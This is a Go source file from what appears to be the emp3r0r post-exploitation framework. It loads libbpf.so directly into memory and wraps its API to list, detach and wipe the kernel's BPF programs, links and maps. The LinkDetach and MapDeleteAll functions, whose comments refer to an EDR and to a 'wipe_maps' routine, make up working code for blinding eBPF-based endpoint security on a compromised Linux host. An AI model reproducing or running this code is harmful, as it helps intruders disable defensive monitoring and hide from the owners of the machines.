//go:build linux && !android && (386 || amd64 || arm64)

// Package libbpf loads libbpf.so in memory and drives its C API through
// memmod, mirroring the core/lib/coffloader pattern for Linux shared objects.
//
// Callers normally use WithLibrary, which resolves the "libbpf" dependency
// through core/lib/memdeps, maps it, runs the callback, and unmaps it before
// returning. Load is the lower-level escape hatch and leaves unmapping to the
// caller. The version-sensitive kernel UAPI layouts stay in Go rather than
// being re-implemented by scripts.
package libbpf

import (
	"encoding/binary"
	"errors"
	"fmt"
	"runtime"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
	"golang.org/x/sys/unix"
)

// Library is a mapped libbpf.so.
type Library struct {
	module *memmod.Module
}

// Object wraps a struct bpf_object *.
type Object struct {
	lib  *Library
	ptr  uintptr
	name string
}

// Program wraps a struct bpf_program *.
type Program struct {
	obj *Object
	ptr uintptr
}

// Link wraps a struct bpf_link *.
type Link struct {
	lib *Library
	ptr uintptr
}

const (
	infoBufSize = 256
	maxIDIter   = 8192
)

// Load maps a libbpf shared object into the current process.
func Load(data []byte) (*Library, error) {
	if len(data) == 0 {
		return nil, errors.New("libbpf: empty shared object")
	}
	module, err := memmod.LoadLibrary(data)
	if err != nil {
		return nil, fmt.Errorf("libbpf: load shared object: %w", err)
	}
	return &Library{module: module}, nil
}

// Close unmaps the library.
func (l *Library) Close() {
	if l != nil && l.module != nil {
		l.module.Free()
		l.module = nil
	}
}

// WithLibrary maps the libbpf dependency, runs fn with it, and unmaps it
// before returning. The mapping never outlives fn, so libbpf is not left
// resident in cleartext while no module is using it.
//
// Any Object, Program or Link obtained inside fn is only valid until fn
// returns; callers must not retain them. It returns an error until the agent
// has wired a dependency resolver (memdeps.SetResolver).
func WithLibrary(fn func(*Library) error) error {
	return memdeps.Use("libbpf", func(module *memmod.Module) error {
		return fn(&Library{module: module})
	})
}

// call invokes an exported libbpf function with up to three machine words.
func (l *Library) call(name string, args ...uintptr) (uintptr, error) {
	if l == nil || l.module == nil {
		return 0, errors.New("libbpf: library is closed")
	}
	return l.module.CallExportWithArgs(name, args...)
}

// getError mirrors libbpf_get_error(ptr): 0 when ptr is not an error pointer,
// otherwise the negative errno encoded in it.
func (l *Library) getError(ptr uintptr) int64 {
	v, err := l.call("libbpf_get_error", ptr)
	if err != nil {
		return -1
	}
	return int64(v)
}

// Version returns the libbpf version string.
func (l *Library) Version() (string, error) {
	ptr, err := l.call("libbpf_version_string")
	if err != nil {
		return "", fmt.Errorf("libbpf: libbpf_version_string: %w", err)
	}
	return cString(ptr, 64), nil
}

// NumPossibleCPUs returns the number of CPUs libbpf sees as possible.
func (l *Library) NumPossibleCPUs() (int, error) {
	v, err := l.call("libbpf_num_possible_cpus")
	if err != nil {
		return 0, fmt.Errorf("libbpf: libbpf_num_possible_cpus: %w", err)
	}
	n := int(int32(uint32(v)))
	if n <= 0 {
		return 0, fmt.Errorf("libbpf: libbpf_num_possible_cpus returned %d", n)
	}
	return n, nil
}

// OpenMem opens a BPF object held in memory. The returned object owns no file.
func (l *Library) OpenMem(image []byte) (*Object, error) {
	if len(image) == 0 {
		return nil, errors.New("libbpf: empty BPF object")
	}
	ptr, err := l.call("bpf_object__open_mem",
		uintptr(unsafe.Pointer(&image[0])), uintptr(len(image)), 0)
	runtime.KeepAlive(image)
	if err != nil {
		return nil, fmt.Errorf("libbpf: bpf_object__open_mem: %w", err)
	}
	if e := l.getError(ptr); e != 0 {
		return nil, fmt.Errorf("libbpf: bpf_object__open_mem: %w", unix.Errno(-e))
	}
	if ptr == 0 {
		return nil, errors.New("libbpf: bpf_object__open_mem returned NULL")
	}
	return &Object{lib: l, ptr: ptr}, nil
}

// Load loads the object into the kernel. It must be called before attaching
// programs or using maps.
func (o *Object) Load() error {
	rc, err := o.lib.call("bpf_object__load", o.ptr)
	if err != nil {
		return fmt.Errorf("libbpf: bpf_object__load: %w", err)
	}
	if e := o.lib.getError(rc); e != 0 {
		return fmt.Errorf("libbpf: bpf_object__load: %w", unix.Errno(-e))
	}
	if int32(uint32(rc)) != 0 {
		return fmt.Errorf("libbpf: bpf_object__load: error %d", int32(uint32(rc)))
	}
	return nil
}

// Close releases the object in userspace.
func (o *Object) Close() {
	if o == nil || o.ptr == 0 {
		return
	}
	_, _ = o.lib.call("bpf_object__close", o.ptr)
	o.ptr = 0
}

// FindProgram returns the named program inside the object.
func (o *Object) FindProgram(name string) (*Program, error) {
	if name == "" {
		return nil, errors.New("libbpf: program name is empty")
	}
	buf := append([]byte(name), 0)
	ptr, err := o.lib.call("bpf_object__find_program_by_name", o.ptr, uintptr(unsafe.Pointer(&buf[0])))
	runtime.KeepAlive(buf)
	if err != nil {
		return nil, fmt.Errorf("libbpf: bpf_object__find_program_by_name: %w", err)
	}
	if ptr == 0 {
		return nil, fmt.Errorf("libbpf: program %q not found", name)
	}
	return &Program{obj: o, ptr: ptr}, nil
}

// Attach attaches the program using libbpf's default attachment strategy.
func (p *Program) Attach() (*Link, error) {
	ptr, err := p.obj.lib.call("bpf_program__attach", p.ptr)
	if err != nil {
		return nil, fmt.Errorf("libbpf: bpf_program__attach: %w", err)
	}
	if e := p.obj.lib.getError(ptr); e != 0 {
		return nil, fmt.Errorf("libbpf: bpf_program__attach: %w", unix.Errno(-e))
	}
	if ptr == 0 {
		return nil, errors.New("libbpf: bpf_program__attach returned NULL")
	}
	return &Link{lib: p.obj.lib, ptr: ptr}, nil
}

// Name returns the program name.
func (p *Program) Name() string {
	ptr, err := p.obj.lib.call("bpf_program__name", p.ptr)
	if err != nil {
		return ""
	}
	return cString(ptr, 64)
}

// Destroy releases an attached link.
func (l *Link) Destroy() {
	if l == nil || l.ptr == 0 {
		return
	}
	_, _ = l.lib.call("bpf_link__destroy", l.ptr)
	l.ptr = 0
}

// --- kernel object enumeration ---------------------------------------------

func (l *Library) iterIDs(kind string) ([]uint32, error) {
	fn := "bpf_" + kind + "_get_next_id"
	out := make([]byte, 4)
	var ids []uint32
	cur := uint32(0)
	for i := 0; i < maxIDIter; i++ {
		rc, err := l.call(fn, uintptr(cur), uintptr(unsafe.Pointer(&out[0])))
		runtime.KeepAlive(out)
		if err != nil {
			return nil, fmt.Errorf("libbpf: %s: %w", fn, err)
		}
		if int32(uint32(rc)) != 0 {
			break // ENOENT / EPERM: no more ids, or not permitted
		}
		next := binary.LittleEndian.Uint32(out)
		if next == 0 {
			break
		}
		ids = append(ids, next)
		cur = next
	}
	return ids, nil
}

func (l *Library) fdByID(kind string, id uint32) (int, error) {
	rc, err := l.call("bpf_"+kind+"_get_fd_by_id", uintptr(id))
	if err != nil {
		return -1, fmt.Errorf("libbpf: bpf_%s_get_fd_by_id: %w", kind, err)
	}
	fd := int(int32(uint32(rc)))
	if fd < 0 {
		return -1, unix.Errno(-fd)
	}
	return fd, nil
}

// progType returns the kernel type of a loaded program.
func (l *Library) progType(progID uint32) (uint32, error) {
	fd, err := l.fdByID("prog", progID)
	if err != nil {
		return 0, err
	}
	defer unix.Close(fd)
	buf, err := l.objInfo(fd)
	if err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint32(buf[0:]), nil
}

func (l *Library) objInfo(fd int) ([]byte, error) {
	buf := make([]byte, infoBufSize)
	infoLen := uint32(len(buf))
	rc, err := l.call("bpf_obj_get_info_by_fd",
		uintptr(fd), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&infoLen)))
	runtime.KeepAlive(buf)
	if err != nil {
		return nil, fmt.Errorf("libbpf: bpf_obj_get_info_by_fd: %w", err)
	}
	if rc != 0 {
		return nil, unix.Errno(int32(uint32(rc)))
	}
	return buf, nil
}

// ProgList enumerates the BPF programs currently loaded in the kernel.
func (l *Library) ProgList() ([]ProgInfo, error) {
	ids, err := l.iterIDs("prog")
	if err != nil {
		return nil, err
	}
	out := make([]ProgInfo, 0, len(ids))
	for _, id := range ids {
		fd, err := l.fdByID("prog", id)
		if err != nil {
			out = append(out, ProgInfo{ID: id})
			continue
		}
		buf, err := l.objInfo(fd)
		_ = unix.Close(fd)
		if err != nil {
			out = append(out, ProgInfo{ID: id})
			continue
		}
		out = append(out, ProgInfo{
			ID:       id,
			Type:     binary.LittleEndian.Uint32(buf[0:]),
			Name:     cStringBytes(buf[64:80]),
			LoadTime: binary.LittleEndian.Uint64(buf[40:]),
			JitedLen: binary.LittleEndian.Uint32(buf[16:]),
			NrMaps:   binary.LittleEndian.Uint32(buf[52:]),
		})
	}
	return out, nil
}

// LinkList enumerates the BPF links currently loaded in the kernel.
func (l *Library) LinkList() ([]LinkInfo, error) {
	ids, err := l.iterIDs("link")
	if err != nil {
		return nil, err
	}
	out := make([]LinkInfo, 0, len(ids))
	for _, id := range ids {
		fd, err := l.fdByID("link", id)
		if err != nil {
			out = append(out, LinkInfo{ID: id})
			continue
		}
		buf, err := l.objInfo(fd)
		_ = unix.Close(fd)
		if err != nil {
			out = append(out, LinkInfo{ID: id})
			continue
		}
		progID := binary.LittleEndian.Uint32(buf[8:])
		progType, _ := l.progType(progID)
		out = append(out, LinkInfo{
			ID:       id,
			Type:     binary.LittleEndian.Uint32(buf[0:]),
			ProgID:   progID,
			ProgType: progType,
		})
	}
	return out, nil
}

// MapList enumerates the BPF maps currently loaded in the kernel.
func (l *Library) MapList() ([]MapInfo, error) {
	ids, err := l.iterIDs("map")
	if err != nil {
		return nil, err
	}
	out := make([]MapInfo, 0, len(ids))
	for _, id := range ids {
		fd, err := l.fdByID("map", id)
		if err != nil {
			out = append(out, MapInfo{ID: id})
			continue
		}
		buf, err := l.objInfo(fd)
		_ = unix.Close(fd)
		if err != nil {
			out = append(out, MapInfo{ID: id})
			continue
		}
		out = append(out, MapInfo{
			ID:         id,
			Type:       binary.LittleEndian.Uint32(buf[0:]),
			KeySize:    binary.LittleEndian.Uint32(buf[8:]),
			ValueSize:  binary.LittleEndian.Uint32(buf[12:]),
			MaxEntries: binary.LittleEndian.Uint32(buf[16:]),
			Name:       cStringBytes(buf[24:40]),
		})
	}
	return out, nil
}

// MapDeleteAll removes every element from the map with the given kernel id,
// returning the number of successful deletions. It mirrors Furtex's
// wipe_maps: key iteration is best-effort and per-element failures do not stop
// the sweep. Types that do not support key iteration (arrays, ringbufs) yield
// zero deletions without an error.
func (l *Library) MapDeleteAll(id uint32) (int, error) {
	fd, err := l.fdByID("map", id)
	if err != nil {
		return 0, err
	}
	defer unix.Close(fd)

	buf, err := l.objInfo(fd)
	if err != nil {
		return 0, err
	}
	keySize := binary.LittleEndian.Uint32(buf[8:])
	if keySize == 0 || keySize > 256 {
		return 0, fmt.Errorf("libbpf: map %d has invalid key size %d", id, keySize)
	}

	key := make([]byte, keySize)
	next := make([]byte, keySize)
	if err := l.mapNextKey(fd, nil, next); err != nil {
		return 0, nil // empty map or a type that has no keys
	}

	deleted := 0
	for i := 0; i < maxIDIter; i++ {
		copy(key, next)
		rc, err := l.call("bpf_map_delete_elem", uintptr(fd), uintptr(unsafe.Pointer(&key[0])))
		runtime.KeepAlive(key)
		if err != nil {
			return deleted, fmt.Errorf("libbpf: bpf_map_delete_elem: %w", err)
		}
		if int32(uint32(rc)) == 0 {
			deleted++
		}
		if err := l.mapNextKey(fd, key, next); err != nil {
			break
		}
	}
	return deleted, nil
}

// mapNextKey fetches the key following key (NULL for the first key) into next.
func (l *Library) mapNextKey(fd int, key, next []byte) error {
	var keyPtr uintptr
	if len(key) > 0 {
		keyPtr = uintptr(unsafe.Pointer(&key[0]))
	}
	rc, err := l.call("bpf_map_get_next_key", uintptr(fd), keyPtr, uintptr(unsafe.Pointer(&next[0])))
	runtime.KeepAlive(key)
	runtime.KeepAlive(next)
	if err != nil {
		return fmt.Errorf("libbpf: bpf_map_get_next_key: %w", err)
	}
	if int32(uint32(rc)) != 0 {
		return unix.Errno(int32(uint32(rc)))
	}
	return nil
}

// LinkDetach detaches the link with the given kernel id and drops our
// reference to it. Some link types do not support forced detach and return an
// error; the EDR may also hold its own reference.
func (l *Library) LinkDetach(id uint32) error {
	fd, err := l.fdByID("link", id)
	if err != nil {
		return err
	}
	defer unix.Close(fd)
	rc, err := l.call("bpf_link_detach", uintptr(fd))
	if err != nil {
		return fmt.Errorf("libbpf: bpf_link_detach: %w", err)
	}
	if rc != 0 {
		return unix.Errno(int32(uint32(rc)))
	}
	return nil
}

// --- helpers ---------------------------------------------------------------

func cString(ptr uintptr, max int) string {
	if ptr == 0 {
		return ""
	}
	buf := make([]byte, 0, 16)
	base := unsafe.Pointer(ptr) //nolint:govet // module-resident NUL-terminated string
	for i := 0; i < max; i++ {
		c := *(*byte)(unsafe.Add(base, i))
		if c == 0 {
			break
		}
		buf = append(buf, c)
	}
	return string(buf)
}

func cStringBytes(b []byte) string {
	for i, c := range b {
		if c == 0 {
			return string(b[:i])
		}
	}
	return string(b)
}
